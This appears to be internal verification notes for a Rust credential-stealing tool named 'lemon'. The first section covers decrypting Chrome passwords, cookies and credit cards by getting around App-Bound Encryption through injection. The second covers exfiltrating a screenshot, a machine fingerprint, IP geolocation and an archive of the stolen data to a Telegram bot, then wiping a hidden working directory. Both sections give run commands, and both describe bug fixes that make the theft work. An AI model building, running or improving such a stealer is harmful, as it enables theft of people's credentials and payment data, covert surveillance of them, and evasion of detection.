# Manual verification — Chrome ABE v20 path

Real-host check that decrypting browser data works end-to-end on a Chrome 127+
machine, including the v20 (`krug`) master-key path.

## Prerequisites
- Windows machine with Chrome **> 127** installed (this run: Chrome 151).
- Release build: `cargo build --release --workspace`.

## Procedure
1. Smoke-test the full decrypt + export on real data:
   ```powershell
   .\target\release\lemon.exe -b chrome -c password,cookie,creditcard -f csv -d verify
   ```
2. Confirm output contains non-empty CSV per profile + category.
3. **Verify values, not just rows**: spot-check that the `password`/`value`
   columns decrypt to real text (empty columns = decryption failure, see the
   APPB bug below).

## Observed result (2026-08-15, Huyy/catcat1204, Chrome 151 + forced ABE)

Chrome 151 rolls out **App-Bound Encryption** (ABE): every cookie/password is
v20-encrypted and the v10 DPAPI key in `Local State` is a dummy.

| Category | Default | Profile 1 | Profile 2 | Profile 3 | Profile 4 | Profile 7 |
|---|---|---|---|---|---|---|
| password | 210/224 | 40/47 | 86/86 | 13/14 | 7/7 | – |
| cookie | 3413/3437 | 690/692 | 623/625 | 515/516 | 411/412 | 199/200 |

Remaining empty rows have a genuinely empty `password_value` in the DB
(verified by prefix probe: `210 × v20`, `14 × empty`), not decrypt failures.
No `v20: retriever failed` warning any more.

## Root cause fixed this session
`crates/keyring/src/abe.rs` forwarded the APPB blob to the injector **with the
`APPB` prefix intact**. The elevation service's `IElevator::DecryptData`
expects the bare ciphertext (Go upstream: `decoded[len("APPB"):]`; xaitax
RESEARCH.md: "the APPB prefix is stripped"). Passing the prefix back made
`DecryptData` reject with `0x8004a004` (`ERROR_INVALID_DATA`), the v20 tier
failed, and every value came out empty.

Fix: strip `APPB_PREFIX` in `read_app_bound_blob` (now returns the bare
ciphertext); a non-`APPB`/undersized blob is a hard error (Go: "unexpected
prefix"), only an *absent* `app_bound_encrypted_key` stays "not applicable".
Unit tests updated (`appb_blob_survives_round_trip` expects stripped bytes,
`dpapi_prefixed_key_is_a_hard_error`).

## Notes
- Inject works via an isolated `--user-data-dir` spawn (issue #576), no
  running Chrome needed.
- `cookie.csv` may be missing for profiles whose Cookies file is locked by a
  running Chrome (`os error 32`); the `copyLocked` fallback is not yet ported
  (Phase 2b, crates/abi). Expected until that lands.

---

# Wave 7 — Telegram exfil verification

Real-host end-to-end check of the report push: full-resolution screenshot,
compact machine caption with a Google Maps hyperlink, and the `save-{USERNAME}`
archive, followed by a hidden-working-dir wipe.

## Prerequisites
- Release build: `cargo build --release --workspace`.
- Telegram bot token + chat id (use a throwaway bot for a real run).

## Procedure
1. Dry preview — caption + screenshot with THIS machine's real info, no send:
   ```powershell
   cargo test -p telegram preview_caption_on_live_host -- --ignored --nocapture
   ```
   (writes `crates/telegram/target/screenshot-preview.png`, prints the caption.)
2. Live send:
   ```powershell
   .\target\release\lemon.exe -b all -c all --tg-token <TOKEN> --tg-chat <ID>
   ```
3. Confirm in the chat: photo at **full screen resolution**, caption with
   `📍 Location: <a href="https://www.google.com/maps?q=…">…</a>`, browser list
   (one line each), then `save-{USERNAME}.zip`. Log must end
   `telegram: delivered (screenshot + archive)` + `delivered: true` and
   `telegram: wiped working dir …`.

## Observed result (2026-08-15, Huyy/catcat1204)
- Working dir: `%TEMP%\lemon_<pid>_…tmp` (hidden, `FILE_ATTRIBUTE_HIDDEN`),
  wiped after the send.
- Screenshot: 1536×864 (native, no downscale) — colour-fixed (BGR→RGB).
- Caption: OS `Windows 11 Pro 25H2 (Build 26200.9168)`, CPU i5-13450HX,
  GPU Intel UHD, disks C/D/G, HWID, IP + `Location` Google-Maps hyperlink,
  then `📊 Chrome — 8500 entries · 6 profiles`-style browser lines.
- Log: `telegram: screenshot sent`, `save-catcat1204.zip sent`,
  `delivered (screenshot + archive)`, `delivered: true`, `Done in ~13s`.
- Full dump ran over 29.5k entries / 9 profiles in the hidden dir first.

## Root causes fixed this session
1. **Status always read as 0** (`delivered: false` even though Telegram
   accepted): `WinHttpQueryHeaders(WINHTTP_QUERY_STATUS_CODE)` returns the code
   as a NUL-terminated **UTF-16 string** (`"200"`), not a DWORD. A 4-byte
   buffer made the query fail with `ERROR_INSUFFICIENT_BUFFER` (0x7A).
   Fix: read into a 16-wide buffer and parse the decimal text
   (`crates/abi/src/http.rs`).
2. **Screenshot yellow/green cast**: GDI 24bpp hands back BGR scanlines; fixed
   with a per-pixel channel swap in `screenshot_png` (`bgr_to_rgb`).
3. **ip-api.com returned `{}`** for this IP → geolocation switched to
   `https://ipinfo.io/json` (no key; `loc` = `"lat,lon"`, plus city/region/
   country), still best-effort and non-fatal.

## Notes
- Location is delivered as a **hyperlink in the caption** (`geo_anchor`), not a
  live map pin.
- The dump itself still honours `-d <dir>` when given explicitly; the hidden
  temp dir + wipe only kick in when a Telegram target is set and no `-d` was
  passed (detected via clap `ValueSource::CommandLine`).